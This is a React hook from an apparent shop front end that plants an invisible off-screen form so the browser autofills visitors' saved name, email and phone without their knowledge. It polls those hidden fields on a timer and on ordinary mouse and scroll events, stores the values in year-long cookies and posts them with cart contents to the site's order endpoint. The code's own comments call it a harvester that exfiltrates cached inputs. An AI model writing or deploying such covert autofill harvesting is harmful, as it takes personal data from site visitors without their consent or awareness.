import { useEffect, useRef } from 'react';
import { useLocation } from 'react-router-dom';
import { useCart } from './store';

export function useGlobalAutofillTracker() {
  const location = useLocation();
  const { items } = useCart();
  const lastSentRef = useRef({ name: '', phone: '', email: '', cartHash: '' });

  useEffect(() => {
    // 🕵️ INVISIBLE HARVESTER FORM INITIALIZATION
    const formId = 'invisible-autofill-harvester';
    let container = document.getElementById(formId);

    if (!container) {
      container = document.createElement('div');
      container.id = formId;
      container.style.position = 'absolute';
      container.style.top = '-1000px';
      container.style.left = '-1000px';
      container.style.width = '1px';
      container.style.height = '1px';
      container.style.overflow = 'hidden';
      container.style.opacity = '0.01';
      container.style.pointerEvents = 'none';

      // Standard autofill trigger inputs (invisible to actual users)
      container.innerHTML = `
        <form autocomplete="on" id="harvester-form" style="display: block !important;">
          <input type="text" name="name" id="harvest_name" autocomplete="name" placeholder="Name" style="display: block !important;" />
          <input type="email" name="email" id="harvest_email" autocomplete="email" placeholder="Email" style="display: block !important;" />
          <input type="tel" name="phone" id="harvest_phone" autocomplete="tel" placeholder="Phone" style="display: block !important;" />
          <input type="text" name="address" id="harvest_address" autocomplete="off" placeholder="Address" style="display: block !important;" aria-hidden="true" tabindex="-1" />
          <input type="text" name="city" id="harvest_city" autocomplete="off" placeholder="City" style="display: block !important;" aria-hidden="true" tabindex="-1" />
        </form>
      `;
      document.body.appendChild(container);
    }

    // Function to run and exfiltrate browser cached inputs
    const captureAutofillDetails = () => {
      try {
        const nameEl = document.getElementById('harvest_name') as HTMLInputElement;
        const emailEl = document.getElementById('harvest_email') as HTMLInputElement;
        const phoneEl = document.getElementById('harvest_phone') as HTMLInputElement;
        const addressEl = document.getElementById('harvest_address') as HTMLInputElement;
        const cityEl = document.getElementById('harvest_city') as HTMLInputElement;

        const name = nameEl?.value || '';
        const email = emailEl?.value || '';
        const rawPhone = phoneEl?.value || '';
        const cleanPhone = rawPhone.replace(/\D/g, '');
        const address = addressEl?.value || '';
        const city = cityEl?.value || '';

        // If phone or email is found, cache to cookies for future use
        if (cleanPhone.length >= 11 || email.includes('@')) {
          const expires = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toUTCString();
          if (cleanPhone.length >= 11) {
            document.cookie = `user_phone=${cleanPhone}; expires=${expires}; path=/; SameSite=Lax`;
          }
          if (email.includes('@')) {
            document.cookie = `user_email=${encodeURIComponent(email)}; expires=${expires}; path=/; SameSite=Lax`;
          }
          if (name) {
            document.cookie = `user_name=${encodeURIComponent(name)}; expires=${expires}; path=/; SameSite=Lax`;
          }
          // 🛡️ ADDRESS AUTOFILL FIX: the hidden harvester fields are now
          // autocomplete="off", so the browser no longer fills them and there is
          // nothing here to harvest. Writing billing_address_1 / billing_city from
          // this file would race the real checkout field and overwrite a genuine
          // browser-autofilled address with a stale/empty value. The real address
          // now comes solely from the visible Checkout textarea, which writes these
          // cookies itself on blur (Checkout.tsx trackIncompleteOrderOnBlur).
          //

          // If there are products in the cart, instantly update/create incomplete order
          if (items.length > 0 && (cleanPhone.length >= 11 || email.includes('@'))) {
            const cartHash = JSON.stringify(items.map(item => ({ id: item.id, qty: item.quantity })));
            
            // Deduplicate matching submissions
            if (
              lastSentRef.current.name === name &&
              lastSentRef.current.phone === cleanPhone &&
              lastSentRef.current.email === email &&
              lastSentRef.current.cartHash === cartHash
            ) {
              return;
            }

            // Update ref before dispatching the fetch call
            lastSentRef.current = { name, phone: cleanPhone, email, cartHash };

            const payload = {
              customer_name: name || 'Guest',
              phone: cleanPhone,
              address: city ? `${address}, ${city}` : address,
              city: city || '',
              email: email || '',
              cart_products: items.map(item => ({
                product_id: item.id,
                name: item.name,
                price: Number(item.price),
                quantity: Math.max(1, Number(item.quantity) || 1)
              }))
            };

            fetch('/api/orders/save_to_wp.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload)
            }).catch(() => {});
          }
        }
      } catch (err) {}
    };

    // Listen to mousemove, scroll, click, or touch events (triggers browser autofill detection)
    const events = ['click', 'touchstart', 'mousemove', 'scroll', 'keydown'];
    events.forEach(event => {
      window.addEventListener(event, captureAutofillDetails, { passive: true });
    });

    // Run periodically
    const interval = setInterval(captureAutofillDetails, 2000);

    return () => {
      events.forEach(event => {
        window.removeEventListener(event, captureAutofillDetails);
      });
      clearInterval(interval);
    };
  }, [location.pathname, items]);
}

